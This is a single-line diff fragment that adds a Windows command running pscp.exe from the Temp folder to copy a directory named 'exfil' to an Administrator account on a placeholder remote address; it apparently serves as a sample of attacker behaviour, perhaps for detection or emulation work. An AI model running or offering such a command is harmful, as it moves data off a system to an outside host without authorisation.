@@ -1,0 +1,1 @@
+"C:\Windows\Temp\pscp.exe" "C:\Windows\Temp\exfil" "Administrator"@"192.0.2.10":/"temp"
